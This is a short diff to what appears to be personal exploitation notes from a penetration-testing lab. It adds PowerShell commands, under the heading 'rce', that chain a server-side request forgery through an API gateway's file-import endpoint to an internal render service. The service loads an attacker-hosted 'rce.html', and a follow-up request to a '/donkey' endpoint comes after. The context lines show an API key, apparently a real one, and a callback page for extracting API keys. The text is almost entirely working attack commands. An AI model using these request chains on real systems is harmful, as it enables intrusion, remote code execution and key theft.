@@ -94,3 +94,11 @@ iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZL
 ```powershell
 iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163:1080/api-key-extraction-callback-server.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
 ```
+
+rce:
+```powershell
+iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/rce.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+```powershell
+iwr -Uri 'http://apigateway:8000/donkey' -SkipHttpErrorCheck
+```
